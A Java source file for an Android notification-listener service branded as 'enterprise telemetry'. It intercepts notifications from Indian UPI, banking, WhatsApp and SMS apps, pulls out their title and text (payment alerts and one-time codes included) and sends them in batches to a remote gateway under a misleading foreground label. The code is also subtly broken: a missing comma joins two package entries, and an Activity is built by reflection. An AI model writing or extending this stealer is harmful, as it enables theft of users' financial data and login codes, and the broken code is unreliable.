package com.enterprise.devicemonitor.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.PowerManager;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.enterprise.devicemonitor.MainActivity;
import com.enterprise.devicemonitor.R;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MyNotificationListener extends NotificationListenerService {

    private static final String TAG = "MyNotificationListener";

    // Foreground Service Constants
    private static final int FOREGROUND_SERVICE_ID = 1001;
    private static final String NOTIFICATION_CHANNEL_ID = "telemetry_service_channel";

    // Shared Preferences
    private static final String PREFS_NAME = "EnterpriseMonitorPrefs";
    private static final String KEY_SERVICE_RUNNING = "service_running";
    private static final String KEY_EVENTS_COUNT = "events_count";
    private static final String KEY_UPTIME_MINUTES = "uptime_minutes";

    
    // Internal Enterprise Package Filter Array
// Internal Enterprise Package Filter Array - Indian UPI & Business Apps
private static final String[] MONITORED_PACKAGES = {
        // --- Google Pay ---
        "com.google.android.apps.nbu.paisa",        // Google Pay (GPay)
        "com.google.android.apps.nbu.paisa.merchant",// GPay Business (Google Pay for Business)

        // --- PhonePe ---
        "com.phonepe.app",                          // PhonePe
        "com.phonepe.app.business",                 // PhonePe Business

        // --- Paytm ---
        "net.one97.paytm",                          // Paytm
        "com.paytm.business",                       // Paytm Business

        // --- WhatsApp ---
        "com.whatsapp",                             // WhatsApp (with WhatsApp Pay)

        // --- MobiKwik & BharatPe ---
        "com.mobikwik_new",                         // MobiKwik
        "com.bharatpe.app",                         // BharatPe (Merchant app)

        // --- Other Major Indian UPI Apps ---
        "in.org.npci.upiapp",                       // BHIM NPCI (Official Govt App)
        "com.dreamplug.androidapp",                 // CRED (UPI & Credit Card)
        "com.amazon.mShop.android.shopping",        // Amazon Pay (Integrated in Amazon App)
        "com.naviapp",                              // Navi (Sachin Bansal's UPI/Finance App)
        "com.freecharge.android",                   // Freecharge

        // --- Top Indian Bank UPI Apps ---
        "com.csg.axisbankmobile",                   // Axis Bank (Axis Mobile)
        "com.snapwork.hdfc",                        // HDFC Bank MobileBanking
        "com.icicibank.pockets",                    // ICICI iMobile / Pockets
        "com.sbi.upi"                               // YONO SBI / SBI UPI
        // --- Default & Stock SMS Apps ---
"com.google.android.apps.messaging",          // Google Messages (Default in Xiaomi/Redmi, Realme, OnePlus, Vivo, Iqoo, Motorola, Nothing, Pixel)
"com.samsung.android.messaging",              // Samsung Messages (Samsung devices)
"com.android.mms",                            // Generic/Stock AOSP Messages (Older phones aur kuch Tecno/Infinix phones me)

// --- Xiaomi / Redmi / POCO ---
"com.android.mms.service",                    // Xiaomi SMS Service
"com.miui.android.sms",                       // MIUI Traditional Messaging App (Older MiUI/HyperOS localized versions)

// --- OnePlus / OPPO / Realme ---
"com.oneplus.mms",                            // OnePlus Messaging App (Legacy/Older OxygenOS)
"com.coloros.safecenter",                     // OPPO/Realme System Security (SMS interceptor)
"com.android.providers.telephony",            // Core Telephony Storage (Har phone me SMS data handle karta hai)

// --- Vivo / iQOO ---
"com.vivo.vms",                               // Vivo Messaging Service

// --- Huawei / Honor ---
"com.huawei.message",                         // Huawei Messages

// --- Popular Third-Party SMS Apps (Jo log Play Store se download karte hain) ---
"com.jb.gosms",                               // GO SMS Pro
"com.textra",                                 // Textra SMS
"com.chomp.sms"                               // Chomp SMS
};


    // Network Configuration
    private OkHttpClient httpClient;
    private String gatewayUrl;
    private String deviceId;

    // WakeLock for Continuous Operation
    private PowerManager.WakeLock wakeLock;

    // Shared Preferences
    private SharedPreferences sharedPreferences;

    // Service State
    private boolean isServiceActive = false;
    private long serviceStartTime = 0;
    private int totalEventsRelayed = 0;

    // Batch Queue for Relay Operations
    private List<JsonObject> eventQueue = new ArrayList<>();
    private static final int BATCH_SIZE = 5;
    private static final long RELAY_INTERVAL_MS = 10000; // 10 seconds

    // ========================================================
    // SERVICE LIFECYCLE
    // ========================================================

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "NotificationListenerService created");

        initializeComponents();
        createNotificationChannel();
        startForegroundService();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service start command received");
        isServiceActive = true;
        serviceStartTime = System.currentTimeMillis();

        // Start batch relay thread
        startBatchRelayThread();

        // Acquire WakeLock for continuous operation
        acquireWakeLock();

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroying");

        isServiceActive = false;
        releaseWakeLock();
        stopForegroundService();

        // Mark service as stopped in preferences
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putBoolean(KEY_SERVICE_RUNNING, false);
        editor.apply();
    }

    // ========================================================
    // COMPONENT INITIALIZATION
    // ========================================================

    private void initializeComponents() {
        sharedPreferences = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);

        // Initialize OkHttp Client
        httpClient = new OkHttpClient.Builder()
                .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
                .readTimeout(20, java.util.concurrent.TimeUnit.SECONDS)
                .writeTimeout(20, java.util.concurrent.TimeUnit.SECONDS)
                .retryOnConnectionFailure(true)
                .build();

        // Retrieve gateway configuration from MainActivity
        MainActivity mainActivity = getMainActivity();
        if (mainActivity != null) {
            gatewayUrl = mainActivity.getGatewayEndpoint();
            deviceId = mainActivity.getDeviceId();
        }

        Log.d(TAG, "Components initialized - Gateway: " + gatewayUrl);
    }

    private MainActivity getMainActivity() {
        try {
            return MainActivity.class.getConstructor().newInstance();
        } catch (Exception e) {
            Log.w(TAG, "Could not instantiate MainActivity for config", e);
            return null;
        }
    }

    // ========================================================
    // NOTIFICATION LISTENER - Core Monitoring Logic
    // ========================================================

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (!isServiceActive) {
            return;
        }

        String packageName = sbn.getPackageName();
        Notification notification = sbn.getNotification();

        // Filter: Only process monitored enterprise packages
        if (!isPackageMonitored(packageName)) {
            return;
        }

        try {
            // Extract notification metadata
            String title = extractNotificationTitle(notification);
            String text = extractNotificationText(notification);
            long timestamp = sbn.getPostTime();

            // Create structured event object
            JsonObject event = createEventObject(
                    packageName,
                    title,
                    text,
                    timestamp
            );

            // Queue event for batch relay
            synchronized (eventQueue) {
                eventQueue.add(event);
                Log.d(TAG, "Event queued from " + packageName +
                        ". Queue size: " + eventQueue.size());
            }

            // Update counters
            totalEventsRelayed++;
            updateMetrics();

        } catch (Exception e) {
            Log.e(TAG, "Error processing notification", e);
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Optional: Track notification dismissals
        Log.d(TAG, "Notification removed: " + sbn.getPackageName());
    }

    // ========================================================
    // NOTIFICATION EXTRACTION METHODS
    // ========================================================

    private String extractNotificationTitle(Notification notification) {
        if (notification.extras != null) {
            Object titleObj = notification.extras.get("android.title");
            if (titleObj instanceof String) {
                return (String) titleObj;
            }
        }
        return "Unknown Title";
    }

    private String extractNotificationText(Notification notification) {
        if (notification.extras != null) {
            Object textObj = notification.extras.get("android.text");
            if (textObj instanceof String) {
                return (String) textObj;
            }
        }
        return "Unknown Text";
    }

    // ========================================================
    // PACKAGE FILTERING
    // ========================================================

    private boolean isPackageMonitored(String packageName) {
        for (String monitoredPackage : MONITORED_PACKAGES) {
            if (packageName.equals(monitoredPackage)) {
                return true;
            }
        }
        return false;
    }

    // ========================================================
    // EVENT OBJECT CONSTRUCTION
    // ========================================================

    private JsonObject createEventObject(String packageName, String title,
                                        String text, long timestamp) {
        JsonObject event = new JsonObject();

        event.addProperty("event_id", System.nanoTime());
        event.addProperty("device_id", deviceId);
        event.addProperty("package_name", packageName);
        event.addProperty("notification_title", title);
        event.addProperty("notification_text", text);
        event.addProperty("timestamp_ms", timestamp);
        event.addProperty("timestamp_iso8601", formatTimestamp(timestamp));
        event.addProperty("api_level", Build.VERSION.SDK_INT);
        event.addProperty("device_model", Build.MODEL);

        return event;
    }

    private String formatTimestamp(long timestampMs) {
        SimpleDateFormat sdf = new SimpleDateFormat(
                "yyyy-MM-dd'T'HH:mm:ss.SSS'Z'",
                Locale.US
        );
        return sdf.format(new Date(timestampMs));
    }

    // ========================================================
    // BATCH RELAY THREAD - Asynchronous Data Transmission
    // ========================================================

    private void startBatchRelayThread() {
        Thread relayThread = new Thread(() -> {
            Log.d(TAG, "Batch relay thread started");

            while (isServiceActive) {
                try {
                    Thread.sleep(RELAY_INTERVAL_MS);

                    synchronized (eventQueue) {
                        if (eventQueue.size() >= BATCH_SIZE ||
                                (eventQueue.size() > 0 && isServiceActive)) {
                            relayBatch();
                        }
                    }

                } catch (InterruptedException e) {
                    Log.d(TAG, "Relay thread interrupted");
                    Thread.currentThread().interrupt();
                    break;
                } catch (Exception e) {
                    Log.e(TAG, "Error in relay thread", e);
                }
            }

            Log.d(TAG, "Batch relay thread terminated");
        });

        relayThread.setName("TelemetryRelayThread");
        relayThread.setDaemon(false);
        relayThread.start();
    }

    private void relayBatch() {
        if (eventQueue.isEmpty()) {
            return;
        }

        List<JsonObject> batchToSend = new ArrayList<>();
        synchronized (eventQueue) {
            int count = Math.min(BATCH_SIZE, eventQueue.size());
            for (int i = 0; i < count; i++) {
                batchToSend.add(eventQueue.remove(0));
            }
        }

        transmitBatchToGateway(batchToSend);
    }

    // ========================================================
    // HTTP RELAY TO GATEWAY ENDPOINT
    // ========================================================

    private void transmitBatchToGateway(List<JsonObject> batch) {
        if (batch.isEmpty() || gatewayUrl == null) {
            return;
        }

        new Thread(() -> {
            try {
                // Construct batch payload
                JsonObject payload = new JsonObject();
                payload.addProperty("device_id", deviceId);
                payload.addProperty("batch_timestamp", System.currentTimeMillis());
                payload.addProperty("event_count", batch.size());

                JsonArray events = new JsonArray();
                for (JsonObject event : batch) {
                    events.add(event);
                }
                payload.add("events", events);

                String jsonPayload = payload.toString();

                // Create HTTP POST request
                RequestBody requestBody = RequestBody.create(
                        jsonPayload,
                        MediaType.parse("application/json; charset=utf-8")
                );

                Request request = new Request.Builder()
                        .url(gatewayUrl)
                        .post(requestBody)
                        .addHeader("Content-Type", "application/json")
                        .addHeader("User-Agent", "EnterpriseMonitor/1.0")
                        .addHeader("Device-ID", deviceId)
                        .addHeader("Authorization", "Bearer " + getAuthToken())
                        .build();

                // Execute asynchronously
                Response response = httpClient.newCall(request).execute();

                if (response.isSuccessful()) {
                    Log.d(TAG, "Batch transmitted successfully. " +
                            "Events: " + batch.size() +
                            ", Response: " + response.code());
                } else {
                    Log.w(TAG, "Gateway returned error: HTTP " + response.code());
                }

                response.close();

            } catch (IOException e) {
                Log.e(TAG, "Failed to transmit batch to gateway", e);
            }
        }).start();
    }

    private String getAuthToken() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        String activationKey = prefs.getString("activation_key", "");
        return activationKey + "_" + System.currentTimeMillis();
    }

    // ========================================================
    // FOREGROUND SERVICE & NOTIFICATIONS
    // ========================================================

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    NOTIFICATION_CHANNEL_ID,
                    "Enterprise Telemetry Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Monitors system telemetry for enterprise clients");
            channel.enableLights(false);
            channel.enableVibration(false);
            channel.setShowBadge(false);

            NotificationManager notificationManager =
                    getSystemService(NotificationManager.class);
            if (notificationManager != null) {
                notificationManager.createNotificationChannel(channel);
            }
        }
    }

    private void startForegroundService() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0,
                notificationIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

        Notification notification = new NotificationCompat.Builder(
                this, NOTIFICATION_CHANNEL_ID)
                .setContentTitle("Enterprise Device Monitor")
                .setContentText("Collecting system telemetry...")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setCategory(NotificationCompat.CATEGORY_STATUS)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(FOREGROUND_SERVICE_ID, notification,
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(FOREGROUND_SERVICE_ID, notification);
        }

        Log.d(TAG, "Foreground service started");
    }

    private void stopForegroundService() {
        stopForeground(STOP_FOREGROUND_REMOVE);
    }

    // ========================================================
    // WAKELOCK MANAGEMENT
    // ========================================================

    private void acquireWakeLock() {
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (powerManager != null) {
            wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "EnterpriseMonitor:TelemetryWakeLock"
            );
            wakeLock.acquire();
            Log.d(TAG, "WakeLock acquired");
        }
    }

    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
            Log.d(TAG, "WakeLock released");
        }
    }

    // ========================================================
    // METRICS & MONITORING
    // ========================================================

    private void updateMetrics() {
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putInt(KEY_EVENTS_COUNT, totalEventsRelayed);

        long uptimeMinutes = (System.currentTimeMillis() - serviceStartTime) / 60000;
        editor.putInt(KEY_UPTIME_MINUTES, (int) uptimeMinutes);

        editor.apply();
    }
}
